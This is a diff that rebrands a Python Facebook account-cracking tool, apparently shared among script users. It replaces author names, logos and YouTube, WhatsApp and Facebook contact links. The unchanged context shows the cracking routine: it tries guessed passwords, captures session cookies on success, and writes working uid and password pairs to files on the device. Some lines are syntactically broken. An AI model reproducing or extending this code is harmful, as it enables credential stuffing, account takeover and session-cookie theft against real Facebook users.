@@ -15,7 +15,7 @@ class jalan:
         pass
 
 
-logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mKASHIF\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mARYAN\x1b[0;m\x1b[1;32m && \x1b[1;33mKASHIF\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m ArYan KhAn\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-KRS\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mKRS\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
+logo = '   \n\x1b[1;32m       888    d8P  8888888b.   .d8888b.  \n\x1b[1;35m       888   d8P   888   Y88b d88P  Y88b \n\x1b[1;35m       888  d8P    888    888 Y88b.      \n\x1b[1;32m       888d88K     888   d88P  "Y888b.   \n\x1b[1;32m       8888888b    8888888P"      "Y88b. \n\x1b[1;35m       888  Y88b   888 T88b         "888 \n\x1b[1;35m       888   Y88b  888  T88b  Y88b  d88P \n\x1b[1;32m       888    Y88b 888   T88b  "Y8888P"  \n\n\x1b[1;37m================= \x1b[32;45mSaadat\x1b[0;m =====================\n\x1b[1;32m     \x1b[1;33mCREATED BY\x1b[0;m   :  \x1b[1;33mSaadat\x1b[0;m\x1b[1;32m && \x1b[1;33mSaadat\x1b[0;m\n\x1b[1;32m     \x1b[1;32mFACEBOK      : \x1b[1;34m Raziqullah saadat\n\x1b[1;32m     \x1b[1;35mGITHUB       :  \x1b[1;35mTEAM-Saadat\n\x1b[1;32m     \x1b[1;36mTOOL STATUS  :  \x1b[1;36mTOOL IS FREE\n\x1b[1;32m     \x1b[1;35mTEAM         :  \x1b[1;35mSaadat\n\x1b[1;32m     \x1b[1;36mTOOL VIRSION :  \x1b[1;36m2.3\n\x1b[1;37m================= \x1b[32;45mARYAN\x1b[0;m =====================\n\n       \x1b[37;41m\t WELLCOME TO KRS TOOL\x1b[0;m\n\n\x1b[1;37m================== \x1b[32;45mNIDA\x1b[0;m ======================\n'
 
 def ud():
     os.system('clear')
@@ -24,7 +24,7 @@ def ud():
     print(' [2] EXIT')
     opt = input('\n   Choose option >>> ')
     if opt == '1':
-        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
+        os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
         FD()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -37,7 +37,7 @@ def FD():
     print(' [2] EXIT')
     opt = input('\n  \x1b[1;32m Choose option >>> ')
     if opt == '1':
-        os.system('xdg-open https://youtu.be/y837qD_AO6Q')
+        os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
         o()
         return None
     None('\n\x1b[1;31mEXIT\x1b[0;97m')
@@ -49,21 +49,21 @@ def o():
     jalan('\tðŸ”¥ðŸ”¥RANDOM NUMBER CRACKðŸ”¥ðŸ”¥')
     print('')
     jalan('\x1b[1;32m [1]\x1b[1;33m RANDOM CRACK ')
-    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON FACEBOOK')
+    jalan('\x1b[1;32m [2] \x1b[1;32mCONTACT ME ON Whatsapp')
     jalan(' \x1b[1;32m[3] \x1b[1;32mSUBSCRIBE MY CHANNEL')
-    jalan(' \x1b[1;32m[4] \x1b[1;32mJOIN FB GROUP')
+    jalan(' \x1b[1;32m[4] \x1b[1;32mFollow FB account )
     jalan(' \x1b[1;32m[00] \x1b[1;31mEXIT')
     opt = input('\n   \x1b[1;32m Choose option >>> ')
     if opt == '1':
         i()
     if None == '2':
-        os.system('xdg-open https://www.facebook.com/profile.php?id=100082840689031')
+        os.system('xdg-open https://www.Whatsapp.com/ +93702856593')
         return None
     if None == '3':
-        os.system('xdg-open https://youtube.com/channel/UCG8CSxk8KQMZuVfRhCa6FBw')
+        os.system('xdg-open https://www.youtube.com/@Saadat.Technical')
         return None
     if None == '4':
-        os.system('xdg-open https://facebook.com/groups/207678473842318/')
+        os.system('xdg-open https://www.facebook.com/profile.php?id=100028315179402')
         return None
     if None == '0':
         os.system('exit')
@@ -165,27 +165,29 @@ bu = current.month
 ha = current.day
 today = date.today()
 logo =                                          ("""   
-\033[1;32m       888    d8P  8888888b.   .d8888b.  
-\033[1;35m       888   d8P   888   Y88b d88P  Y88b 
-\033[1;35m       888  d8P    888    888 Y88b.      
-\033[1;32m       888d88K     888   d88P  "Y888b.   
-\033[1;32m       8888888b    8888888P"      "Y88b. 
-\033[1;35m       888  Y88b   888 T88b         "888 
-\033[1;35m       888   Y88b  888  T88b  Y88b  d88P 
-\033[1;32m       888    Y88b 888   T88b  "Y8888P"  
- 
-\033[1;37m================= \33[32;45mKASHIF\33[0;m =====================
-\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mARYAN\33[0;m\033[1;32m && \033[1;33mKASHIF\33[0;m
-\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m ArYan KhAn
-\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-KRS
+z \033[1;32m....................................................... z
+z \033[1;32m....................................................... z
+\033[1;39m .########...######..##.....##
+\033[1;32m .##.....##.##....##.##.....##
+\033[1;39m .##.....##.##.......##.....##
+\033[1;32m .########...######..#########
+\033[1;39m .##...##.........##.##.....##
+\033[1;32m .##....##..##....##.##.....##
+\033[1;39m .##.....##..######..##.....##
+z \033[1;32m....................................................... z
+z \033[1;32m....................................................... z
+\033[1;37m================= \33[32;45mSaadat\33[0;m =====================
+\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33mRaziq\33[0;m\033[1;32m && \033[1;33mSaadat\33[0;m
+\033[1;32m     \033[1;32mFACEBOK      : \033[1;34m Raziqullah Saadat
+\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mTEAM-Saadat
 \033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
 \033[1;32m     \033[1;35mTEAM         :  \033[1;35mKRS
 \033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.3
 \033[1;37m================= \33[32;45mARYAN\33[0;m =====================
  
-       \33[37;41m\t WELLCOME TO KRS TOOL\33[0;m
+       \33[37;41m\t WELLCOME TO Saadat TOOL\33[0;m
  
-\033[1;37m================== \33[32;45mNIDA\33[0;m ======================\n""")
+\033[1;37m================== \33[32;45mSaadat\33[0;m ======================\n""")
 loop = 0
 oks = []
 cps = []
@@ -335,7 +337,7 @@ def rcrack(uid,pwx,tl):
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[7:22]
-                print('    \033[1;32m(ARYAN-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
+                print('    \033[1;32m(Saadat-OKðŸ”¥)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                 cek_apk(session,coki)
                 open('/sdcard/ARYAN-OK.txt', 'a').write( cid+' | '+ps+'\n')
                 oks.append(cid)
@@ -343,14 +345,14 @@ def rcrack(uid,pwx,tl):
             elif 'checkpoint' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[24:39]
-                print('    \33[1;30m(ARYAN-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
+                print('    \33[1;30m(Saadat-CPðŸ¤•)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                 open('/sdcard/ARYAN-CP.txt', 'a').write( cid+' | '+ps+' \n')
                 cps.append(cid)
                 break
             else:
                 continue
         loop+=1
-        sys.stdout.write('\r     %s[ARYAN] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
+        sys.stdout.write('\r     %s[Saadat] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
         sys.stdout.flush()
     except:
         pass
